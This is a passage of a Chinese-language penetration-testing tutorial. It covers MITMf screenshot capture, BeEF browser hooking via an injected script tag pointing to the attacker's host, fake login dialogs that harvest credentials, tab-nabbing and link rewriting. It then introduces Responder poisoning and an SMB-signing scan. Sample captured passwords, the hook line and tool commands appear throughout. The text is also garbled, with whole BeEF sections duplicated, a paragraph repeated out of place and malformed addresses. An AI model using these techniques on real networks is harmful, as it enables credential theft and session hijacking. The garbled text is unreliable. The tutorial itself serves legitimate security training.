
导航到`/usr/share/mitmf/logs`目录以查看所有保存的截图。下面的示例显示目标正在 Google 上搜索“Puppies（小狗）”：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_202_0.png)

当然，你可能会发现更有用的东西，比如下面的截图：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_202_1.png)

目标成功访问了你的在线邮箱账户。如果你导航到 MITMF 日志目录并查看 `mitm.log` 文件，你可能会发现其他有用信息：

```
Type:Firefox/39.0 (Windows) POST DATA (login.live.com)

login=live.com?cookie=1&options=G1&IsPartition&IsRegion&IsScaleUnit&passwd=====
```

在我编写此内容时，我也成功地针对 Windows 10 系统、Mac 甚至一个通过 Wi-Fi 连接到局域网的安卓手机运行了此插件。尽管有时插件无法提取图像，只有屏幕的文本部分。

## FilePwn Shell Injection (文件漏洞注入)

"Filepwn" 能够在文件下载时向其插入后门。该插件使用 Metasploit 和 Backdoor Factory 尝试向用户尝试从网络下载的任何文件注入后门。如果 MITMF 能够对该应用实施后门化，当文件被执行时将打开一个 Meter shell。它并非总是 100% 有效，但这是一个非常有趣的攻击向量。由于这更像是一种高级攻击，我将其作为一个选项留给读者，根据自己的意愿进行探索。

我们已经看到了如何使用 MITMf 执行中间人攻击和基础操纵。接下来，我们将介绍如何使用 MITMF 和浏览器利用框架进行一种基于注入的攻击。

## 浏览器利用框架 (BeEF)

**工具作者：** Wade Alcorn

**工具网站：** https://beefproject.com/

中间人攻击非常有用，但有时你可能希望能够在数据流中插入或注入 HTML、脚本或代码。这样，当目标系统浏览时，我们控制的数据就会被添加到他们接收的内容中。使用 MITMf 进行基于注入的攻击有几种方法，让我们快速查看使用浏览器利用框架（或称 "BeEF"）进行的 JS 注入攻击。

BeEF 是一种渗透测试工具，允许你针对目标的网络浏览器运行各种攻击。它通过“钩住”（hooking）目标，然后允许你通过浏览器直接向计算机发送命令。这是通过图形用户界面实现的。学习如何使用 BeEF 的最佳方法就是动手上手，让我们开始吧。在本节中，我们将使用 MITMf 自动将 BeEF “钩”注入到我们的目标中。我们将使用 BeEF 的图形用户界面控制并向系统发送命令。

**在你的 Kali 虚拟机上：**

从 Kali 菜单启动 BeEF -> `0-Exploitation Tools > beef`

请等待 BeEF 服务启动。打开后，你可能需要刷新一次浏览器。

Web UI: `http://127.0.0.1:3000/ui/panel`
Hook: `<script src="http://IP:3000/hook.js"></script>`
Example: `<script src="http://127.0.0.1:3000/hook.js"></script>`

浏览器利用框架将加载并启动几个网页，包括 Web 界面。离开此终端窗口并在打开的浏览器中用用户名 "beef" 登录：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_202_0.png)

你将看到 BeEF 的控制面板，如下：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_202_1.png)

| 钩住浏览器 | 启动 |
| :--- | :--- |
| 在线浏览器 | |
| 离线浏览器 | |

BeEF 通过“钩住”目标来工作，然后允许你通过浏览器直接向计算机发送命令。这是通过图形用户界面实现的。学习如何使用 BeEF 的最佳方法就是动手上手，让我们开始吧。在本节中，我们将使用 MITMf 自动将 BeEF “钩”注入到我们的目标中。我们将使用 BeEF 的图形用户界面控制并向系统发送命令。

**在你的 Kali 虚拟机上：**

从 Kali 菜单启动 BeEF -> `0-Exploitation Tools > beef`

请等待 BeEF 服务启动。打开后，你可能需要刷新一次浏览器。

Web UI: `http://127.0.0.1:3000/ui/panel`
Hook: `<script src="http://IP:3000/hook.js"></script>`
Example: `<script src="http://127.0.0.1:3000/hook.js"></script>`

浏览器利用框架将加载并启动几个网页，包括 Web 界面。离开此终端窗口并在打开的浏览器中用用户名 "beef" 登录：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_202_0.png)

你将看到 BeEF 的控制面板，如下：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_202_1.png)

| 钩住浏览器 | 启动 |
| :--- | :--- |
| 在线浏览器 | |
| 离线浏览器 | |

*(注：原文此处存在大量重复内容，已按文档工程标准进行去重处理)*

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_208_0.png)

你几乎可以形象地看到这一过程。“噢不，”Windows 用户惊呼道，“我的 Facebook 超时了！对于某些人来说，这简直是世界末日。但话说回来，你倒得问为什么一个企业用户会在 Facebook 上呢？抛开浏览偏好和公司政策不谈，如果用户中招并输入了凭据，这些就会出现在 BeEF 控制面板中：

data: answer=testuser@test.com:ILuvSecurePasswords!
用户名:testuer@test.com 和密码: ILuvSecurePasswords!

花一分钟尝试“小偷盗用模块”（Petty Theft Module）下“对话框类型”（Dialog Type）的其他选项。例如，这里是 Windows 安全模块：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_208_1.png)

从目标的角度来看，连接到服务器的连接似乎超时了，他们需要输入登录凭据。同样，如果他们输入了凭据，我们会在 BeEF 中收到它们的副本。

## 标签劫持模块 (Tab Nabbing Module)

标签劫持模块从社会工程学的角度来看非常有趣。对于该模块，你只需要设置 URL 和等待时间。在指定时间后，闲置的网页将被重定向到指定的 URL。这可以是我们设置的一个伪造站点，看起来像合法站点。

目前，我们将仅使用基础 beef 页面来演示其工作原理：

选择 TabNabbing Module

## 将 URL 设置为基础 Beef 页面：
`http://192.168.1.39:3000/demos/basic.html`

你可能还想将等待时间改为 1 分钟。
然后点击 `Execute`（执行）。

注意，你必须输入 Kali 系统的 IP 地址，因为列出的默认 IP 是 `0.0.0.0`：

| 描述 | 该模块在标签未活动一段时间后，将将其重定向到指定的 URL |
|---|---|
| Id | 114 |
| URL | `http://192.168.1.39:3000/demos/basic.html` |
| Wait (分钟) | 1 |

然后在 Windows 7 系统上，让当前窗口保持打开，打开一个新的浏览器标签页并让它留在那里。这模拟了一个同时打开了多个浏览器窗口的用户。现在谁的浏览器只开一个窗口呢？前提是用户会忘记他们最初打开的内容，并被诱骗与我们通过 Beef 显示的网站交互。这可以是一个简单的登录页面，或者更好，直接跳转到我们设置的伪造热门社交媒体网站的社会工程学页面。这种技术非常适合与社会工程学工具（SE Toolkit，将在下一章介绍）配合使用。

在开始时，我们的浏览器看起来像下图所示。我们的用户在 Google 上进行搜索，然后打开了另一个标签和一个新的 Google 会话：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_209_0.png)

在一分钟的等待期结束后，当我们的目标用户忙于使用 Google 时，注意闲置的标签已从原始的 Google 页面变成了 BeEF 基础演示页面：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_209_1.png)

如果你点击第一个闲置的 Google 浏览器标签页，你确实会看到网页已经了。它现在是 BeEF 基础演示页面。同样，这在社会工程学攻击中效果非常好，通过设置你自己的服务器，并让标签劫持模块在页面闲置时自动跳转到该位置。

## 动态更改 HREFS

我们可以通过“被挂持域名替换 HREFS”（Hooked Domain Replace HREFS）模块动态更改网页上的链接。如果用户点击任何链接，他们将转到我们指定的网页，而不是页面本身指定的原始页面。这会实时更改页面上的所有链接，而用户完全无感知，将其指向你希望受害者去往任何地方。

假设我们知道目标是一个纽约巨人队（New York Giants）橄榄球球迷，尽管他们来自我们不喜欢的纽约，我们希望他们在点击任何链接时被发送到达拉斯牛仔队队的主页。我们可以通过 Replace HREFS 命令实现这一点。

在 Windows 中，访问目标，BeEF 基础演示页面将显示：
`http://192.168.1:3000/demos/basic.html`

在 BeEF 菜单中，在模块树（Module Tree）下，选择 `Browser > Hooked Domain > Replace Hrefs`

输入你想要替换链接的网站：

| 描述 | 该模块将重写所有匹配链接的 href 属性 |
|---|---|
| Id | 38 |
| URL | `http://dallascboys.com/` |

然后点击 `execute`（执行）

这是将页面上所有链接更改为指向达拉斯牛仔队网站后的网页。当鼠标悬停在页面上的任何链接上时，你在 Replace HREF 模块中编写任何内容都会显示在屏幕上。当我将鼠标悬停在 BeEF 中的“ha.ckers.org homepage”链接上时：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_211_0.png)

从目标的角度来看，连接到服务器的连接似乎超时了，他们需要输入登录凭据。同样，如果他们输入了凭据，我们会在 BeEF 中收到它们的副本。

## 结论

本章只是快速介绍了使用中间人攻击框架（MitM Framework）和浏览器漏洞框架（BeEF）可以做的许多事情之一。这两者都是非常棒的工具，我建议读者花时间阅读帮助部分并检查不同的可用插件。正如我们所见，中间人攻击简单而有效。当你能从手机或平板电脑运行它们时，它们会更有趣。

## 第15 章：使用 Responder、Multi-Relay 和 MITMf 进行服务投毒

在本章中，我们将讨论如何使用 Responder 从存在漏洞的 Windows 网络中轻松获取用户凭据（哈希值和明文密码）。我们将介绍如何使用 Responder 的 Multi-Relay 工具在有线网络上通过“哈希值传递（Pass the Hash）”获取远程 shell。我们将通过使用 PowerShell 创建远程 Meterpreter shell 来进一步加深对目标的控制。最后，我们将在 MITMtf 中使用 responder。

- **Responder** - 一种渗透测试人员用于针对 LLMNR、NBT-NS 和基于 WPAD 的投毒攻击的首选工具。基本上，responder 会对网络进行投毒，并对多个法的网络服务广告做出响应，试图欺骗服务或用户交出凭据。
- **Multi-Relay** - Responder 自带的一个工具，能够获取 Responder 到的凭据并将其用于“哈希值传递”风格的攻击中，从而通过重用密码哈希值访问其他网络系统。

在 Windows 网络中，如果无法通过 DNS 找到网络资源，它将依赖 LLMNR 或 NBT-NS 来查找网络资源（如果已启用）。Responder 会投毒这些服务，使其响应这些请求，并在某些情况下欺骗网络交出密码哈希以连接到虚假服务。WPAD 也用于某些大型环境，为工作站提供互联网代理地址。许多浏览器在打开互联网浏览器时，默认设置为自动检测系统代理。在 Windows 网络环境中，WPAD 提供这些信息。Responder 模拟了此服务，并可用于欺骗用户交出他们连接互联网服务的凭据。

本章最初是作为我的 Kali NetHunter（Kali 的手机版本）文章之一编写的。在原文中，我使用 Kali NetHunter 作为攻击平台，并在工作组（非域域）环境中使用 Windows 2016 服务器和 Windows 10 企业版客户端，运行效果非常好。我还在带有 Windows 7 客户端的 Windows 2012 r2 服务器上测试了这一点，结果非常相似。因此，我们在我们的 Windows 7 测试虚拟机上运行它不应该有任何问题。

微软在针对“哈希值传递”类型攻击和限制其有效性方面做了很多工作。这些攻击不再像过去那样有效，但你仍有可能发现漏洞目标。Multi-Relay 攻击工具依赖于目标网络禁用了 SMB 签名（signing），基本上这意味着目标网络必须存在漏洞，在某些情况下意味着操作系统配置错误或运行着旧版本的软件/服务。所有当前的 Windows 操作系统都支持 SMB 签名，并且在域控制器上是自动启用的。Responder 包含一个名为 `RunFinger` 的工具，可以快速扫描网络以查看是否有任何机器易受到此类攻击的侵害。

在 Kali 终端中：

1. 导航到 `/usr/share/responder/tools`
2. 输入 `/RunFinger.py -i 192.168.1.0/24`

这将像下面所示扫描我们的网络以寻找漏洞系统：

```
root@kali://usr/share/responder/tools# ./RunFinger.py -i 192.168.1.0/24

Retrieving information for 192.168.1.23...

SMB signing: False

Null Sessions Allowed: True

Vulnerable to MS10-010: True

Server time: 2018-06-20 16:19:08

Os version: 'Windows 7 Professional 7600'

Lanman Client: 'Windows 7 Professional 6.1'

Machine Hostname: 'WIN-420RBM3SRVF'

This machine is part of the 'WORKGROUP' domain
```

如你所见，Windows 7 虚拟机实际上易受到这种攻击，因为没有启用 SMB 签名。在测试中，我发现只有在禁用 SMB 签名时，Multi-Relay 才能对 Administrator 账户“传递哈希值”。尽管在启用 SMB 签名的网络中 Responder 仍然能够获取账户信息，但如果用户输入了错误的 UNC 路径或正在使用 WPAD 并被骗输入他们的凭据。我们已经介绍了 Responder 并解释了我们将如何使用它，现在让我们看看它的实际运行！

> **警告：**
> 与所有安全工具一样，在尝试在实时生产环境中使用工具之前，请确保你理解使用该工具的全部后果（特别是修改网络服务流量的工具）！

## Responder

Responder 从终端提示符运行，让我们使用默认设置启动它。

此命令简单地启动带有默认服务投毒的 responder 并在 eth0 接口上运行，如下所示：

```
root@kali:~# responder -I eth0

NBT-NS, LLMNR & MDNS Responder 2.3.3.9

Author: Laurent Gaffie (laurent.gaffie@gmail.com)

To this script hit CTRL-C
```
